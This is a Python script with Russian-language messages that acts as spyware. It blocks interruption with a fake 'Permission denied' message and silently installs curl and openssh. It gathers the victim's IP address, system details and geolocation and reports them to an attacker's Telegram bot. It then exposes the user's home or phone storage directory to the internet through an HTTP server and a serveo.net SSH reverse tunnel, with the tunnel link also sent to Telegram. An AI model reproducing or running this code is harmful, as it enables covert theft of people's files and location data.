import time
import subprocess
import requests
import os
import threading
import sys
import signal
import random
import platform
import json
import re

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''
begin = ''

def signal_handler(sig, frame):
    print("Unable to kill process. Permission denied.")
        
signal.signal(signal.SIGINT, signal_handler)
    
class HiFiles:
    def __init__(self):
        self.os_name = platform.system()
        self.sys_name = 'undefined'
        self.emoji = ''
        self.ssh_output = []
        self.path = ''
    
    def send_telegram_message(self, message):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message
        }
        requests.post(url, data=payload)

    def get_geolocation(self):
        try:
            result = subprocess.run(['curl', 'https://ipinfo.io/json'], capture_output=True, text=True)
            if result.returncode == 0:
                return json.loads(result.stdout)
            else:
                self.send_telegram_message("🌐❌ Ошибка при выполнении curl.")
                return None
        except Exception as e:
            self.send_telegram_message(f"🌐❌ Произошла ошибка при получении гео: {e}")
            return None

    def get_location_by_ip(self, ip):
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        if response.status_code == 200:
            return response.json()
        else:
            self.send_telegram_message("⛓️‍💥 Ошибка при выполнении запроса к ipinfo.io")
            return None
            
    def session(self):
        global ssh, ssh_output
        global path
        process1 = subprocess.Popen(['python', '-m', 'http.server', '8080', '-d', f'{self.path}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process2 = subprocess.Popen(['ssh', '-R', '80:localhost:8080', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        threading.Thread(target=self.send_output, args=(process1,)).start()
        while True:
            line = process2.stdout.readline()
            if not line:
                break
            self.ssh_output.append(line.decode('utf-8').strip())

    def send_output(self, process):
        if self.ssh_output:
            ssh_output_str = '\n'.join(self.ssh_output)  # Объединяем все строки
            # Удаляем управляющие последовательности ANSI
            ssh_output_str = re.sub(r'\x1B\[[0-?9;]*[mK]', '', ssh_output_str)
            self.send_telegram_message(f"🛜 Соединение установлено:\n{ssh_output_str}")
            self.ssh_output.clear()  # Очищаем список после отправки сообщения
        else:
            self.send_telegram_message("🛜 Ожидание данных...")
            time.sleep(5)
            self.send_output(process)
    
    def run_commands(self):
        global begin
        print(begin)
        try:
            if self.os_name == "Linux":
                if os.path.exists('/data/data/com.termux/files'):
                    self.sys_name = "Termux (Android)"
                    self.emoji = '📱'
                    subprocess.run(['pkg', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(['pkg', 'install', 'openssh', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.path = '/storage/emulated/0'
                else:
                    self.sys_name = "Linux Debian-based"
                    self.emoji = '🐧'
                    subprocess.run(['sudo', 'apt', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(['sudo', 'apt', 'install', 'openssh', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.path = '/home'
            elif self.os_name == "Darwin":
                self.sys_name = "MacOS"
                self.emoji = '🍏'
                subprocess.run(['brew', 'install', 'curl'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['brew', 'install', 'openssh'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.path = '/Users'
            elif self.os_name == "Windows":
                self.sys_name = "Windows"
                self.emoji = '💻'
                self.path = r'C:'
            else:
                self.send_telegram_message(f"⚠️ Неизвестная ОС! : {self.os_name}")
                self.emoji = '⚠️'
                self.sys_name = "Неопределенная ОС"
        except Exception as e:
            self.send_telegram_message(f"❄1�7 Ошибка установки зависимостей, продолжаю работу: {e}")
            print(f"Ошибка установки зависимостей: {e}")
        try:
            result = subprocess.run(['curl', 'ifconfig.me'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                ip_address = result.stdout.strip()
            else:
                ip_address = '🚫'
            ver = platform.version()
            arch = platform.architecture()
            geo_data = self.get_geolocation()
            if geo_data:
                latitude, longitude = geo_data['loc'].split(',')
                location_info = self.get_location_by_ip(ip_address)
                location_message = (
                    f"🌍 Гео\n"
                    f"Широта: {latitude}\n"
                    f"Долгота: {longitude}\n"
                )
                if location_info:
                    location_message += (
                        f"Город: {location_info.get('city', 'Неизвестно')}\n"
                        f"Регион: {location_info.get('region', 'Неизвестно')}\n"
                        f"Страна: {location_info.get('country', 'Неизвестно')}\n"
                        f"Почтовый индекс: {location_info.get('postal', 'Неизвестно')}\n"
                    )
                else:
                    location_message += "❄1�7 Не удалось получить доп инфу."
            else:
                location_message = "🌐❌ Не удалось получить гео."
            self.send_telegram_message(f"{self.emoji} Новая сессия\nКлиент/IP: {ip_address}\nСистема: {self.sys_name} {ver} {arch}\n {location_message}")
        except Exception as e:
            self.send_telegram_message(f"🚫 Fatal: {e}")
        if self.os_name == "Windows":
            os.system('cls')  # Для Windows
        elif self.os_name in ["Linux", "Darwin"]:  # Linux и macOS
            os.system('clear')  # Для Linux и macOS
        else:
            self.send_telegram_message(f"🚫 Fatal. Unsupported platform.")
            pass
        ssh_thread = threading.Thread(target=self.session)
        ssh_thread.start()

    def hifiles(self):
        self.run_commands()

if __name__ == "__main__":
    hifiles_instance = HiFiles()
    hifiles_instance.hifiles()